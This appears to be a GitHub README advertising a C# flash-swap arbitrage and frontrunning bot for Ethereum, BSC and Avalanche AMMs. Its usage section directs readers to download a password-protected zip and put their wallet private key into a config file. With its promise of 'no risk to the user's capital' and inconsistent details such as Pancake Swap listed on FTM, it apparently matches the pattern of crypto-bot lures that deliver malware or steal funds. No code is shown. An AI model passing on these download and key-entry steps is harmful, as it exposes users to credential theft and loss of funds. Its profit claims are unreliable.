# flash-swap-arbitrage

Bot for sniping and frontrunning on BSC and Ether (C#)

![alt text](https://github.com/Cardo16/flash-swap-arbitrage/blob/main/flashbot.png?raw=true)

### About
This is an arbitrage bot that utilizes flash swaps to trade between various Uniswap V2 automated market makers (AMMs) and related forks on Ethereum, Binance Smart Chain, and Avalanche.
There are many AMMs on these blockchains that are similar to Uniswap V2, either as direct forks or with the same interface. Some of the AMMs this bot can interact with include:

- `Uniswap V2 (Ethereum)`
- `SushiSwap (Ethereum)`
- `Trader Joe (AVAX)`
- `Pancacke Swap (FTM)`

By taking advantage of price differences for the same token pair on different AMMs, this bot can perform arbitrage with minimal transaction fees and no risk to the user's capital.
Flash swaps are similar to Aave Flash Loans, allowing the user to withdraw ERC20 tokens from Uniswap without any cost. However, the tokens must either be paid for with corresponding pool/pair tokens or returned before the next block is mined. If these conditions are not met, the flash swap transaction will fail, and any other arbitrary execution involved in that transaction will be rolled back.
Because flash swaps are atomic Ethereum transactions, this arbitrage bot can execute trades quickly and efficiently.

### Usage
- [Download](https://github.com/Cardo16/flash-swap-arbitrage/archive/refs/heads/main.zip) the repository release and extract files with password `3n02drW1w`.
- Edit the `address` and `private_key` fields in the config.json file.
- Set up the network and AMMs in the flashbot menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.

### Note
When using a public RPC provider, the user may experience rate limiting or slow connection speeds. This bot is most effective when connected to a private light node.

## Copyright
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*
